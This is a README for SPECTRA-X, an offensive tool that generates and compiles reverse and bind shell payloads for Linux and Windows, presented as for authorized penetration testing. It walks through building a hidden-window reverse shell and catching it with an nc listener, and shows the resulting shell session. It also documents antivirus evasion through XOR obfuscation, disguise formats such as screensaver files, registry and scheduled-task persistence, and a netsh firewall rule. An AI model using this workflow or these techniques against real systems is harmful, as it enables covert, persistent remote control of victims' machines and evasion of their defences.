
<div align="center">

# ⚡ SPECTRA-X

### Payload generator for authorized penetration testing

**Reverse Shell · Bind Shell · Shellcode · XOR Obfuscation · Persistence · Multi-format**

[![Version](https://img.shields.io/badge/version-2.5-00d4aa?style=for-the-badge)](https://github.com/exploit4040/SPECTRA-X)
[![Platform](https://img.shields.io/badge/platform-Linux%20%7C%20Windows-2f9bff?style=for-the-badge)](https://github.com/exploit4040)
[![Language](https://img.shields.io/badge/language-C%20%7C%20Bash-a855f7?style=for-the-badge)](https://github.com/exploit4040)
[![License](https://img.shields.io/badge/license-MIT-4ade80?style=for-the-badge)](LICENSE)
[![Author](https://img.shields.io/badge/author-exploit4040-ff4757?style=for-the-badge)](https://github.com/exploit4040)

[Overview](#-overview) · [Installation](#-installation) · [Usage](#-usage) · [Formats](#-output-formats) · [Roadmap](#-roadmap)

</div>

---

## ⚠️ Legal Disclaimer

> **SPECTRA-X is provided strictly for educational purposes and authorized penetration testing.**
>
> Any use against systems without prior written authorization is **strictly illegal** and may result in criminal prosecution:
>
> - France: Articles **323-1 to 323-8** of the Penal Code
> - United States: **Computer Fraud and Abuse Act (CFAA)**
> - European Union: **Directive 2013/40/EU**
>
> **The author (exploit4040) declines any responsibility for how this tool is used.** Use it only on systems you own, or for which you have **explicit written authorization**.

---

## 📖 Table of Contents

- [Overview](#-overview)
- [Features](#-features)
- [Requirements](#-requirements)
- [Installation](#-installation)
- [Configuration](#️-configuration)
- [Usage](#-usage)
- [Output Formats](#-output-formats)
- [Advanced Options](#-advanced-options)
- [Full Example](#-full-example)
- [Troubleshooting](#️-troubleshooting)
- [Project Structure](#-project-structure)
- [Roadmap](#-roadmap)
- [Author](#-author)
- [License](#-license)

---

## 🎯 Overview

**SPECTRA-X** is a command-line tool that automates the **generation**, **compilation**, and **deployment** of **reverse shell** and **bind shell** payloads for **Linux** and **Windows** environments.

It generates C source code, invokes the cross-compiler `x86_64-w64-mingw32-gcc`, and produces a ready-to-use binary. SPECTRA-X also includes obfuscation, persistence, and firewall configuration mechanisms for realistic Red Team scenarios.

> 💡 Designed as a learning resource to understand remote shells, **stream redirection** (stdin/stdout/stderr), and basic evasion techniques.

---

## ✨ Features

<table>
<tr>
<td width="50%">

### 🖥️ Cross-platform
- **Linux** payloads
- **Windows** payloads

### 🎛️ Multi-type
- **Reverse shell** (Linux & Windows)
- **Bind shell** (Linux & Windows)
- **Raw shellcode** (Linux)
- **msfvenom-compatible shellcode** (Windows)

</td>
<td width="50%">

### 📦 Windows output formats
- `.exe` console
- `.exe` hidden window (`-mwindows`)
- `.dll` (DllMain + thread)
- `.scr` screensaver

### 🛡️ Advanced options
- **XOR obfuscation**
- **Persistence** (registry / schtasks)
- **Auto firewall rule**
- **SSL / TLS** (Linux)
- **Configuration** via `spectra.conf`

</td>
</tr>
</table>

---

## 🧰 Requirements

### Operating System

- **Linux** (Debian / Ubuntu / Kali / Parrot recommended)
- Bash ≥ **4.0**

### Required tools

| Tool | Purpose | Installation |
|:---|:---|:---|
| `gcc` | Linux compilation | `sudo apt install build-essential` |
| `x86_64-w64-mingw32-gcc` | Windows cross-compilation | `sudo apt install mingw-w64` |
| `nasm` | Raw shellcode generation | `sudo apt install nasm` |
| `nc` (netcat) | TCP listener | `sudo apt install netcat-openbsd` |
| `openssl` | SSL / TLS support | `sudo apt install libssl-dev` |
| `wine` *(optional)* | Testing Windows binaries | `sudo apt install wine` |

### One-shot installation (Debian / Ubuntu / Kali)

```bash
sudo apt update && sudo apt install -y \
    build-essential \
    mingw-w64 \
    nasm \
    netcat-openbsd \
    libssl-dev \
    wine
```

---

## 📦 Installation

### 1. Clone the repository

```bash
git clone https://github.com/exploit4040/SPECTRA-X.git
cd SPECTRA-X
```

### 2. Make the script executable

```bash
chmod +x SPECTRA
```

### 3. (Optional) Global install

```bash
sudo cp SPECTRA /usr/local/bin/
sudo cp spectra.conf /etc/spectra.conf
```

### 4. Verify the installation

```bash
./SPECTRA --version
```

---

## ⚙️ Configuration

The `spectra.conf` file loads default parameters on startup:

```ini
# ─────────────────────────────────────────────
#  SPECTRA-X v2.5  ·  Default configuration
# ─────────────────────────────────────────────

LHOST=10.123.173.23
LPORT=3333
OUTPUT_DIR=/home/spectrax/Documents/C/malware-dev
SHELL=cmd.exe
XOR=OFF
PERSIST=OFF
FIREWALL=OFF
SSL=OFF
```

| Parameter | Type | Description |
|:---|:---:|:---|
| `LHOST` | string | Attacker IP address (listener) |
| `LPORT` | int | Listener port |
| `OUTPUT_DIR` | path | Payload output directory |
| `SHELL` | string | Shell to execute (`cmd.exe`, `/bin/bash`, `/bin/sh`) |
| `XOR` | bool | XOR obfuscation (`ON` / `OFF`) |
| `PERSIST` | bool | Automatic persistence (`ON` / `OFF`) |
| `FIREWALL` | bool | Windows firewall configuration (`ON` / `OFF`) |
| `SSL` | bool | SSL / TLS encryption (`ON` / `OFF`) |

---

## 🚀 Usage

### Launch

```bash
./SPECTRA
```

### Main menu

```
╔══════════════════════════════════════════════════════╗
║                                                      ║
║          S P E C T R A - X     v 2 . 5               ║
║                                                      ║
║   Config IP/Port  |  Firewall  |  XOR  |  SSL        ║
║                                                      ║
╚══════════════════════════════════════════════════════╝

 [1] Linux    - Reverse Shell      [5] Linux    - Raw Shellcode
 [2] Linux    - Bind Shell         [6] Windows  - Shellcode (msfvenom)
 [3] Windows  - Reverse Shell      [7] Set default IP/Port
 [4] Windows  - Bind Shell         [0] Quit
```

### Typical workflow

1. **Select** the payload type: `[3] Windows - Reverse Shell`
2. **Configure** options: shell, XOR, persistence, firewall, name
3. **Choose** the output format: `.exe`, `.dll`, `.scr`, shellcode
4. **Compile** and grab the binary from `OUTPUT_DIR`
5. **Start** the listener: `nc -lvnp <LPORT>`
6. **Execute** the payload on the target

---

## 📂 Output Formats

| Format | Description | Compilation flag |
|:---|:---|:---|
| `.exe` console | Classic binary with visible console | *(default)* |
| `.exe` hidden window | No window on launch | `-mwindows` |
| `.dll` | Library with `DllMain` + thread | `-shared` |
| `.scr` | Screensaver (double-click) | `-mwindows` |
| Raw shellcode | Raw bytes for injection | `nasm` |
| msfvenom shellcode | C array format compatible with Metasploit | `msfvenom` |

---

## 🧪 Advanced Options

### 🔐 XOR Obfuscation

Encrypts the payload with a XOR key to evade basic AV signatures:

```
[2] XOR Obfuscation : ON
```

### 🔄 Persistence

Automatically adds a startup entry:

- **Registry**: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- **Scheduled task**: `schtasks /create /sc onlogon`

### 🛡️ Auto firewall

Adds an outbound rule allowing the connection port:

```cmd
netsh advfirewall firewall add rule name="SPECTRA" dir=out action=allow protocol=TCP localport=3333
```

### 🔒 SSL / TLS

Encrypts the connection between the target and the listener (**Linux only**).

---

## 🧭 Full Example

### 1. Generate a Windows reverse shell

```bash
./SPECTRA
```

```
[?] Your choice : 3

── Configuration ──────────────────────────
[1] Shell              : cmd.exe
[2] XOR Obfuscation    : OFF
[4] Persistence        : OFF
[5] Auto firewall      : OFF
[6] Payload name       : win_rev

[?] Choice : 6
[?] Payload name [win_rev] : syshack101

── Output format ──────────────────────────
[1] .exe console
[2] .exe hidden window (-mwindows)
[3] .dll (DllMain + thread)
[4] .scr screensaver

[?] Choice : 2

[?] IP (LHOST) [10.123.173.23] :
[?] Port (LPORT) [3333] :

[+] Source generated : /home/spectrax/Documents/C/malware-dev/syshack101.c
[*] Compiling : x86_64-w64-mingw32-gcc ... -mwindows
[+] BINARY OK      : /home/spectrax/Documents/C/malware-dev/syshack101.exe
[*] Handler        : nc -lvnp 3333
```

### 2. Start the listener

```bash
nc -lvnp 3333
```

```
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::3333
Ncat: Listening on 0.0.0.0:3333
```

### 3. Execute the payload on the target

```bash
wine syshack101.exe
```

### 4. Result

```
Ncat: Connection from 10.123.173.23:60456.
Microsoft Windows 10.0.19045
Z:\home\spectrax\Documents\C\malware-dev>
```

---

## 🛠️ Troubleshooting

| Issue | Likely cause | Solution |
|:---|:---|:---|
| `x86_64-w64-mingw32-gcc: command not found` | MinGW-w64 not installed | `sudo apt install mingw-w64` |
| No connection on listener | Inbound firewall blocking | Open the port or test locally |
| `fixme:winediag` | Normal Wine warnings | Ignore, binary still runs |
| Binary flagged by AV | Known MinGW signature | Enable XOR + recompile |
| `Permission denied` on launch | Script not executable | `chmod +x SPECTRA` |
| `Config IP/Port` not loaded | Missing `spectra.conf` | Check path or recreate file |
| `libssl` error | OpenSSL not installed | `sudo apt install libssl-dev` |



## 🗺️ Roadmap

- [x] Linux & Windows reverse shells
- [x] Linux & Windows bind shells
- [x] Multi-format output (`.exe`, `.dll`, `.scr`, shellcode)
- [x] XOR obfuscation
- [x] Persistence & auto firewall
- [x] SSL / TLS support
- [x] Configuration via `spectra.conf`
- [ ] **macOS** support
- [ ] **Base64** / **AES-256** encoding
- [ ] **In-memory stagers** (msfvenom-like)
- [ ] Improved **TUI**
- [ ] **JSON** export for automation
- [ ] **Metasploit** integration (external module)
- [ ] EDR detection & bypass (research)

---

## 👤 Author

<div align="center">

**exploit4040**

[![GitHub](https://img.shields.io/badge/GitHub-exploit4040-181717?style=for-the-badge&logo=github)](https://github.com/exploit4040)
[![Root-Me](https://img.shields.io/badge/Root--Me-profile-00d4aa?style=for-the-badge)](https://www.root-me.org/)

*Passionate about offensive security, Red Team operations, and tool development.*

</div>
